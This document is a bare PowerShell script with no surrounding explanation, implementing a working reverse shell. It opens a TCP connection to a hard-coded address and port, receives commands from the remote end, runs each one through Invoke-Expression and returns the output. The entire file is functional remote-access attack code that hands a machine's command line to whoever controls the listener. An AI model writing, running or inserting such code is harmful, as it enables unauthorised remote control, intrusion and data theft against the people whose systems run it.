$ip_addr = "192.168.64.4";
$port = "8888";

$TCP_Client = New-Object System.Net.Sockets.TCPClient($ip_addr, $port);
$TCP_Stream = $TCP_Client.GetStream();

[byte[]] $buffer = 0..65535 | %{0};
$prompt = ([text.encoding]::ASCII).GetBytes('$ ' + (Get-Location).Path + '> ');
$TCP_Stream.Write($prompt, 0, $prompt.Length);

while (($i = $TCP_Stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $command = ([text.encoding]::ASCII).GetString($buffer, 0, $i);
        try {
                $output = (iex -c $command 2>&1 | Out-String);
        } catch {
                Write-Warning 'Error.';
                Write-Error $_;
        }
        $prompt = $output + '$ ' + (Get-Location).Path + '> ';
        $result = ([text.encoding]::ASCII).GetBytes($prompt);
        $TCP_Stream.Write($result, 0, $result.Length);
        $TCP_Stream.Flush();
};

$TCP_Client.Close();
